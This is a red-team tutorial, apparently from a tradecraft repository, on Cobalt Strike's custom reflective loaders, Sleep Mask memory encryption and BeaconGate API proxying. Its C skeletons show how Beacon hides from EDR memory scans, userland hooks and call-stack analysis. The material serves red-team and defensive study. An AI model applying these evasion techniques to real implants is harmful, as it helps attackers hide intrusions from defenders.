# UDRL and Sleep Mask - Advanced Beacon Evasion

## Overview

User-Defined Reflective Loaders (UDRL) and Sleep Masks are advanced Cobalt Strike features that enable deep customization of Beacon's memory operations and evasion capabilities. Together with BeaconGate, they form a powerful framework for sophisticated in-memory evasion.

## What is UDRL?

**UDRL (User-Defined Reflective Loader)** allows operators to replace Beacon's default reflective loader with custom implementations, going beyond the limitations of Malleable C2 profile options.

### Traditional vs UDRL Approach

**Traditional (Malleable C2)**:
```
stage {
    set obfuscate "true";
    set allocator "VirtualAlloc";
    set stomppe "true";
    set userwx "false";
}
```

**UDRL Approach**:
- Complete control over PE loading logic
- Custom memory allocation strategies
- Advanced syscall resolution
- Integration with Sleep Mask and BeaconGate

## What is Sleep Mask?

**Sleep Mask** is a feature that obfuscates Beacon's memory during sleep periods to evade memory scanning by EDR/AV products.

### The Problem
When Beacon sleeps, its memory contains:
- Unencrypted code and data
- Recognizable PE structure
- Suspicious patterns (PE headers, import tables, etc.)
- Configuration data in clear text

### The Solution
Sleep Mask encrypts/obfuscates Beacon's memory before sleep and restores it upon waking:
```
Beacon Active → Sleep → Mask Memory → Sleep → Unmask → Beacon Active
```

## What is BeaconGate?

**BeaconGate** instructs Beacon to proxy supported API calls through a custom Sleep Mask, enabling masked execution with integrated evasion techniques.

### Key Benefit
Combines call stack spoofing, syscall execution, and memory masking in a single unified framework.

## Architecture

```
┌─────────────────────────────────────────┐
│          UDRL (Custom Loader)           │
├─────────────────────────────────────────┤
│  • Custom PE parsing                    │
│  • Memory allocation strategy           │
│  • Syscall resolution                   │
│  • Communicates with Sleep Mask         │
└────────────┬────────────────────────────┘
             ↓
┌─────────────────────────────────────────┐
│       Sleep Mask (Memory Masking)       │
├─────────────────────────────────────────┤
│  • Receives allocation metadata         │
│  • Masks memory during sleep            │
│  • Unmasks before execution             │
│  • Works with BeaconGate                │
└────────────┬────────────────────────────┘
             ↓
┌─────────────────────────────────────────┐
│      BeaconGate (API Proxying)          │
├─────────────────────────────────────────┤
│  • Proxies API calls via Sleep Mask     │
│  • Call stack spoofing                  │
│  • Custom syscall execution             │
│  • Transparent to BOFs                  │
└─────────────────────────────────────────┘
```

## UDRL Implementation

### Basic UDRL Requirements

A UDRL must implement:

```c
// 1. Locate DLL image in memory
void* beacon_dll = find_beacon_image();

// 2. Parse NT Headers
PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)beacon_dll;
PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(
    (BYTE*)beacon_dll + dos_header->e_lfanew
);

// 3. Resolve essential APIs via PEB walking
resolve_critical_apis();

// 4. Allocate memory with custom strategy
void* beacon_base = custom_allocate(image_size, allocation_strategy);

// 5. Copy and map PE sections
map_pe_sections(beacon_base, beacon_dll);

// 6. Resolve imports and relocations
resolve_import_table(beacon_base);
process_relocations(beacon_base);

// 7. Execute entry point
call_dll_main(beacon_base, DLL_PROCESS_ATTACH);
```

### Memory Region Communication

UDRL communicates allocation details to Sleep Mask:

```c
typedef struct {
    DWORD purpose;           // Allocation purpose
    void* base_address;      // Base address
    SIZE_T size;             // Region size
    DWORD memory_type;       // Type classification
    SECTION_INFO sections[]; // Section details
    BOOL cleanup_required;   // Cleanup flag
} ALLOCATED_MEMORY_REGION;
```

Pass to Beacon before initialization:
```c
// During UDRL execution
pass_to_beacon_via_dll_beacon_user_data(&allocated_regions);
```

### Custom Syscall Resolution

UDRL can populate custom syscall information:

```c
typedef struct {
    void* function_ptr;      // Function address
    void* jump_address;      // Jump instruction address
    DWORD syscall_number;    // System call number
} SYSCALL_API;

typedef struct {
    SYSCALL_API nt_allocate_virtual_memory;
    SYSCALL_API nt_protect_virtual_memory;
    SYSCALL_API nt_free_virtual_memory;
    // ... other syscalls
} BEACON_SYSCALLS;

// Populate during UDRL init
populate_syscall_info(&syscall_data);
```

**Execution Modes**:
- **Direct**: Uses `function_ptr` directly
- **Indirect**: Uses `jump_address` + `syscall_number`

## Sleep Mask Implementation

### Receiving Allocation Metadata

```c
typedef struct {
    ALLOCATED_MEMORY_REGION* regions;
    DWORD region_count;
} SLEEPMASK_INFO;

void sleep_mask_entry(PSLEEPMASK_INFO info) {
    // Access allocated regions
    for (DWORD i = 0; i < info->region_count; i++) {
        ALLOCATED_MEMORY_REGION* region = &info->regions[i];

        // Mask based on actual allocation patterns
        mask_memory_region(region);
    }
}
```

### Masking Strategies

**1. XOR Encryption**:
```c
void xor_mask(void* base, SIZE_T size, BYTE key) {
    BYTE* ptr = (BYTE*)base;
    for (SIZE_T i = 0; i < size; i++) {
        ptr[i] ^= key;
    }
}
```

**2. RC4 Encryption**:
```c
void rc4_mask(void* base, SIZE_T size, BYTE* key, DWORD keylen) {
    // RC4 encrypt memory
    rc4_crypt(base, size, key, keylen);
}
```

**3. Custom Algorithms**:
```c
void custom_mask(void* base, SIZE_T size) {
    // Implement custom obfuscation
    // - Permutation cipher
    // - Block cipher
    // - Custom encoding
}
```

### Selective Masking

```c
void sleep_mask_selective(PSLEEPMASK_INFO info) {
    for (DWORD i = 0; i < info->region_count; i++) {
        ALLOCATED_MEMORY_REGION* region = &info->regions[i];

        // Only mask specific regions
        if (region->purpose == BEACON_CODE ||
            region->purpose == BEACON_DATA) {
            mask_memory_region(region);
        }

        // Leave heap allocations unmasked
        if (region->memory_type == HEAP_MEMORY) {
            continue;
        }
    }
}
```

## BeaconGate Implementation

### API Proxying Framework

```c
typedef struct {
    void* function_ptr;      // Target function
    DWORD api_enum;          // WinAPI identifier
    DWORD arg_count;         // Number of arguments
    void* args[];            // Argument array
    BOOL should_mask;        // Masking flag
    void* return_value;      // Return value storage
} FUNCTION_CALL;

void* BeaconGateWrapper(FUNCTION_CALL* call) {
    // 1. Optionally mask Beacon
    if (call->should_mask) {
        mask_beacon_memory();
    }

    // 2. Execute call stack spoofing
    spoof_call_stack();

    // 3. Make API call via custom method
    void* result = execute_api_call(call);

    // 4. Unmask before returning
    if (call->should_mask) {
        unmask_beacon_memory();
    }

    return result;
}
```

### Accessing Syscall Information

```c
BEACON_SYSCALLS* syscalls = BeaconGetSyscallInformation();

// CRITICAL: Must be done before masking
// Syscall data is copied from Beacon memory
```

### Priority Configuration

In Malleable C2 profile:
```
set syscall_method "direct";  # Standard syscalls
set beacon_gate "true";       # Enable BeaconGate

# BeaconGate takes priority if both are set
```

## Integration Workflow

### Complete Integration Example

```c
// 1. UDRL allocates memory and resolves syscalls
void udrl_main(void* beacon_dll, SIZE_T dll_size) {
    // Custom allocation
    ALLOCATED_MEMORY_REGION region = {0};
    region.base_address = custom_allocate_beacon();
    region.size = calculate_image_size(beacon_dll);

    // Resolve custom syscalls
    BEACON_SYSCALLS syscalls = {0};
    resolve_custom_syscalls(&syscalls);

    // Pass metadata to Beacon
    DLL_BEACON_USER_DATA user_data = {0};
    user_data.allocated_regions = &region;
    user_data.syscall_info = &syscalls;

    pass_to_beacon(&user_data);

    // Load Beacon
    load_beacon_pe(beacon_dll, region.base_address);
}

// 2. Sleep Mask receives metadata
void sleep_mask_main(PSLEEPMASK_INFO info) {
    // Access allocation data from UDRL
    for (DWORD i = 0; i < info->region_count; i++) {
        // Intelligent masking based on actual allocations
        mask_region(&info->regions[i]);
    }
}

// 3. BeaconGate proxies API calls
void* beacon_gate_handler(FUNCTION_CALL* call) {
    // Get syscalls from UDRL
    BEACON_SYSCALLS* syscalls = BeaconGetSyscallInformation();

    // Mask Beacon
    mask_beacon_memory();

    // Execute with call stack spoofing
    void* result = execute_with_spoofing(call, syscalls);

    // Unmask
    unmask_beacon_memory();

    return result;
}
```

## BOF Integration

BOFs transparently benefit from all configured evasion:

```c
// BOF code (no changes needed)
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

void go(char* args, int len) {
    // This call automatically uses:
    // - Custom syscalls (if UDRL configured)
    // - BeaconGate proxying (if enabled)
    // - Memory masking (if configured)
    void* mem = KERNEL32$VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
}
```

BOF helper functions abstract the implementation:
```c
// Same code works with all configurations
void* mem = BeaconVirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
HANDLE hProcess = BeaconOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```

## Critical Considerations

### UDRL Caveat

**⚠️ Important**: When using UDRL, `stage` block options in C2 profile are **ignored**:

```
# These are IGNORED with UDRL:
stage {
    set userwx "false";      # IGNORED
    set obfuscate "true";    # IGNORED
    set allocator "...";     # IGNORED
}
```

**Impact**: If UDRL allocates RWX memory but Sleep Mask expects separate regions, conflicts occur.

**Solution**: Ensure UDRL allocation strategy matches Sleep Mask expectations.

### Memory Allocation Strategy

UDRL and Sleep Mask must align:

```c
// UDRL allocates RWX (single region)
void* beacon = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Sleep Mask expects RWX
void sleep_mask(PSLEEPMASK_INFO info) {
    // Expects single RWX region
    // Works correctly
}

// MISMATCH EXAMPLE (causes issues):
// UDRL allocates RW + RX (separate regions)
void* code = VirtualAlloc(NULL, code_size, MEM_COMMIT, PAGE_EXECUTE_READ);
void* data = VirtualAlloc(NULL, data_size, MEM_COMMIT, PAGE_READWRITE);

// Sleep Mask expects RWX (single region)
// CONFLICT - may crash or fail to mask properly
```

### BeaconGate Priority

```c
// In C2 profile
set syscall_method "direct";
set beacon_gate "true";

// BeaconGate takes priority
// syscall_method is ignored when BeaconGate is enabled
```

## Use Cases

### 1. Custom Memory Allocation

**Scenario**: Evade VirtualAlloc monitoring

**UDRL Implementation**:
```c
// Use NtAllocateVirtualMemory directly
void* beacon = syscall_allocate_memory(size);

// Or use alternative allocators
void* beacon = allocate_via_heap();
void* beacon = allocate_via_mapped_file();
```

### 2. Syscall Evasion

**Scenario**: Bypass userland hooks

**UDRL + BeaconGate**:
```c
// UDRL resolves direct syscalls
resolve_syscalls_via_hell_gate();

// BeaconGate uses them for all API calls
// Bypasses userland hooks completely
```

### 3. Memory Scanning Evasion

**Scenario**: Evade periodic memory scans

**Sleep Mask**:
```c
// Before sleep
mask_all_beacon_memory();

// After sleep
unmask_beacon_memory();

// Memory scanner sees encrypted garbage
```

### 4. Call Stack Analysis Evasion

**Scenario**: Evade call stack-based detection

**BeaconGate with Call Stack Spoofing**:
```c
void* beacon_gate(FUNCTION_CALL* call) {
    // Spoof call stack before API call
    spoof_stack_via_vulcan_raven();

    // Execute API
    void* result = make_api_call(call);

    // Restore
    restore_stack();

    return result;
}
```

## Related Techniques

- [Position Independent Code](../position-independent-code/) - PIC fundamentals
- [Crystal Palace](../crystal-palace/) - Building custom loaders
- [EDR Evasion](../edr-evasion/) - Call stack spoofing and other evasion
- [Aspect-Oriented Programming](../aspect-oriented-tradecraft/) - Instrumentation

## Resources

- [UDRL, SleepMask, and BeaconGate](https://rastamouse.me/udrl-sleepmask-and-beacongate/) - Rasta Mouse
- [Cobalt Strike Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/)
- [SleepyCrypt](https://github.com/Oct0xor/SleepyCrypt) - Community Sleep Mask implementation

## Next Steps

1. Read [NOTES.md](./NOTES.md) for quick reference
2. Study [examples/](./examples/) for implementation examples
3. Review [RED_TEAM_USAGE.md](./RED_TEAM_USAGE.md) for operational guidance
4. Explore [ADVANCEMENTS.md](./ADVANCEMENTS.md) for future research
